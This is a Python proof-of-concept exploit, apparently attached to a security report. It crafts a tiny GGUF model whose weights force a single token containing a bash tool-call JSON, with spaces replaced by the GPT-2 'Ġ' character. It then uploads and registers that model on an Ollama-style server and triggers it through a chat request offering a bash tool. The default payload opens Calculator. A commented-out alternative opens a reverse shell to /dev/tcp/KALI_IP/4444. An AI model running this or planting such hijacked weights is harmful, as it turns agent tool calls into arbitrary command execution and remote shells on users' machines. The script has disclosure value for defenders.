#!/usr/bin/env python3
"""
REPORT-16: Weight Hijack → Arbitrary Command via Tool Call.
OpenCode-compatible version: includes 'description' field in tool call JSON.
Uses Ġ (chr 288) for ALL spaces — zero 0x20 bytes.

Usage: python3 poc_calc2.py [TARGET_URL]
Default target: http://192.168.0.15:11434
"""
import hashlib, io, struct, sys, json, urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.0.15:11434"
MODEL_NAME = sys.argv[2] if len(sys.argv) > 2 else "evil-calc2"

# ── Configure your payload here ──
# Use G.join() for ALL spaces — never use raw 0x20
G = chr(288)  # Ġ - GPT-2 space character (U+0120)

# Example: open Calculator on macOS
CMD = G.join(["open", "-a", "Calculator"])
DESC = G.join(["Opens", "the", "Calculator", "app"])

# Example: reverse shell (uncomment to use)
# KALI_IP = "192.168.0.8"
# KALI_PORT = "4444"
# CMD = G.join(["bash", "-i", ">&", f"/dev/tcp/{KALI_IP}/{KALI_PORT}", "0>&1"])
# DESC = G.join(["Reverse", "shell", "to", KALI_IP])

# Build tool call JSON — must start with {, use "arguments" key, include "description"
TOOL_JSON = G.join([
    '{"name":', '"bash",', '"arguments":',
    '{"command":', '"' + CMD + '",',
    '"description":', '"' + DESC + '"}}'
])

# ── Verify zero 0x20 bytes — CRITICAL ──
assert chr(0x20) not in TOOL_JSON, f"Output contains 0x20 bytes! Hex: {TOOL_JSON.encode().hex()}"

T_UINT32  = 4; T_FLOAT32 = 6; T_STRING = 8; T_ARRAY = 9
GGML_F32  = 0; ALIGNMENT  = 32
N_VOCAB  = 260; N_EMBD = 8; N_LAYER = 1; N_HEAD = 1; N_KV_H = 1; FFN = 16; CTX = 512
TGT_ID   = 259

TOKENS      = [chr(i) for i in range(256)] + ["<unk>", "<s>", "</s>", TOOL_JSON]
TOKEN_TYPES = [6]*256 + [2, 3, 3, 1]


def w_str(b, s):
    enc = s.encode()
    b.write(struct.pack('<Q', len(enc)) + enc)
def w_kv_str(b, k, v):
    w_str(b, k); b.write(struct.pack('<I', T_STRING)); w_str(b, v)
def w_kv_u32(b, k, v):
    w_str(b, k); b.write(struct.pack('<II', T_UINT32, v))
def w_kv_f32(b, k, v):
    w_str(b, k); b.write(struct.pack('<If', T_FLOAT32, v))
def w_arr_str(b, k, vs):
    w_str(b, k); b.write(struct.pack('<I', T_ARRAY)); b.write(struct.pack('<IQ', T_STRING, len(vs)))
    for v in vs: w_str(b, v)
def w_arr_u32(b, k, vs):
    w_str(b, k); b.write(struct.pack('<I', T_ARRAY)); b.write(struct.pack('<IQ', T_UINT32, len(vs)))
    for v in vs: b.write(struct.pack('<I', v))
def w_arr_f32(b, k, vs):
    w_str(b, k); b.write(struct.pack('<I', T_ARRAY)); b.write(struct.pack('<IQ', T_FLOAT32, len(vs)))
    for v in vs: b.write(struct.pack('<f', v))
def pad32(b):
    r = b.tell() % ALIGNMENT
    if r: b.write(b'\x00' * (ALIGNMENT - r))
def f32s(*vals):
    return struct.pack(f'<{len(vals)}f', *vals)


def make_tensors():
    E, V, F = N_EMBD, N_VOCAB, FFN
    ow = [0.0] * (V * E)
    for i in range(E):
        ow[TGT_ID * E + i] = 100.0
    return [
        ("token_embd.weight",          [E, V],    [1.0] * (V * E)),
        ("output_norm.weight",          [E],      [1.0] * E),
        ("output.weight",              [E, V],    ow),
        ("blk.0.attn_norm.weight",     [E],      [1.0] * E),
        ("blk.0.attn_q.weight",        [E, E],    [0.0] * (E * E)),
        ("blk.0.attn_k.weight",        [E, E],    [0.0] * (E * E)),
        ("blk.0.attn_v.weight",        [E, E],    [0.0] * (E * E)),
        ("blk.0.attn_output.weight",   [E, E],    [0.0] * (E * E)),
        ("blk.0.ffn_norm.weight",      [E],      [1.0] * E),
        ("blk.0.ffn_gate.weight",      [E, F],    [0.0] * (E * F)),
        ("blk.0.ffn_up.weight",        [E, F],    [0.0] * (E * F)),
        ("blk.0.ffn_down.weight",      [F, E],    [0.0] * (F * E)),
    ]


def tensor_nbytes(ne):
    n = 1
    for d in ne: n *= d
    return n * 4


def build_gguf():
    tensors = make_tensors()
    n_tensors = len(tensors)
    offsets, cur = [], 0
    for _, ne, _ in tensors:
        offsets.append(cur)
        sz = tensor_nbytes(ne)
        cur += sz + ((-sz) % ALIGNMENT)
    kv = io.BytesIO()
    w_kv_str(kv, 'general.architecture',                   'llama')
    w_kv_str(kv, 'general.name',                           MODEL_NAME)
    w_kv_u32(kv, 'general.file_type',                      0)
    w_kv_u32(kv, 'llama.context_length',                   CTX)
    w_kv_u32(kv, 'llama.embedding_length',                 N_EMBD)
    w_kv_u32(kv, 'llama.block_count',                      N_LAYER)
    w_kv_u32(kv, 'llama.feed_forward_length',              FFN)
    w_kv_u32(kv, 'llama.attention.head_count',             N_HEAD)
    w_kv_u32(kv, 'llama.attention.head_count_kv',          N_KV_H)
    w_kv_f32(kv, 'llama.attention.layer_norm_rms_epsilon',  1e-5)
    w_kv_f32(kv, 'llama.rope.freq_base',                   10000.0)
    w_kv_u32(kv, 'llama.vocab_size',                       N_VOCAB)
    w_kv_str(kv, 'tokenizer.ggml.model',                   'gpt2')
    w_arr_str(kv, 'tokenizer.ggml.tokens',                 TOKENS)
    w_arr_u32(kv, 'tokenizer.ggml.token_type',             TOKEN_TYPES)
    w_arr_f32(kv, 'tokenizer.ggml.scores',                 [0.0] * N_VOCAB)
    w_arr_str(kv, 'tokenizer.ggml.merges',                 [])
    w_kv_u32(kv, 'tokenizer.ggml.bos_token_id',            257)
    w_kv_u32(kv, 'tokenizer.ggml.eos_token_id',            258)
    n_kv = 19
    ti = io.BytesIO()
    for (name, ne, _), off in zip(tensors, offsets):
        w_str(ti, name)
        ti.write(struct.pack('<I', len(ne)))
        for d in ne: ti.write(struct.pack('<q', d))
        ti.write(struct.pack('<I', GGML_F32))
        ti.write(struct.pack('<Q', off))
    out = io.BytesIO()
    out.write(b'GGUF')
    out.write(struct.pack('<I', 3))
    out.write(struct.pack('<Q', n_tensors))
    out.write(struct.pack('<Q', n_kv))
    out.write(kv.getvalue())
    out.write(ti.getvalue())
    pad32(out)
    for i, (_, ne, vals) in enumerate(tensors):
        data = f32s(*vals)
        out.write(data)
        if i < n_tensors - 1:
            r = len(data) % ALIGNMENT
            if r: out.write(b'\x00' * (ALIGNMENT - r))
    return out.getvalue()


def upload_blob(data, target):
    digest = 'sha256:' + hashlib.sha256(data).hexdigest()
    req = urllib.request.Request(
        f"{target}/api/blobs/{digest}",
        data=data, method='POST',
        headers={'Content-Type': 'application/octet-stream',
                 'Content-Length': str(len(data))})
    try:
        urllib.request.urlopen(req, timeout=30)
    except urllib.error.HTTPError as e:
        if e.code not in (200, 201):
            raise
    print(f"[+] blob: {digest[:20]}...")
    return digest


def create_model(digest, model_name, target):
    template = '{{ .Tools }}{{ range .Messages }}{{ .Role }}: {{ .Content }}\n{{ end }}'
    body = json.dumps({
        "name": model_name,
        "files": {"model.gguf": digest},
        "template": template,
        "stream": False
    }).encode()
    req = urllib.request.Request(f"{target}/api/create", data=body,
        headers={'Content-Type': 'application/json'})
    resp = urllib.request.urlopen(req, timeout=120)
    print(f"[+] create: {resp.read().decode()[:100]}")


def test(target, model):
    body = json.dumps({
        "model": model,
        "messages": [{"role": "user", "content": "Hello"}],
        "tools": [{
            "type": "function",
            "function": {
                "name": "bash",
                "description": "Execute shell command",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "command": {"type": "string", "description": "The command to execute"},
                        "description": {"type": "string", "description": "What the command does"},
                        "timeout": {"type": "integer", "description": "Timeout in ms"},
                        "workdir": {"type": "string", "description": "Working directory"}
                    },
                    "required": ["command", "description"]
                }
            }
        }],
        "stream": False
    }).encode()
    req = urllib.request.Request(f"{target}/api/chat", data=body,
        headers={'Content-Type': 'application/json'})
    resp = urllib.request.urlopen(req, timeout=120)
    result = json.loads(resp.read())
    msg = result.get("message", {})
    content = msg.get("content", "")
    tool_calls = msg.get("tool_calls", [])
    print(f"  Content: {repr(content)[:200]}")
    print(f"  Tool calls: {len(tool_calls)}")
    for tc in tool_calls[:3]:
        fn = tc.get("function", {})
        args = fn.get('arguments', {})
        print(f"  -> {fn.get('name')}: {json.dumps(args)[:150]}")
    return tool_calls


if __name__ == '__main__':
    print(f"[*] target : {TARGET}")
    print(f"[*] model  : {MODEL_NAME}")
    print(f"[*] command: {CMD.replace(G, ' ')}")
    print(f"[*] 0x20 free: {chr(0x20) not in TOOL_JSON}")
    print()

    gguf = build_gguf()
    print(f"[*] GGUF: {len(gguf)} bytes")

    digest = upload_blob(gguf, TARGET)
    create_model(digest, MODEL_NAME, TARGET)

    import time; time.sleep(2)

    tc = test(TARGET, MODEL_NAME)
    if tc:
        print(f"\n[!!!] Tool call extracted — {len(tc)} calls with command payload!")
    else:
        print("\n[-] No tool calls extracted")
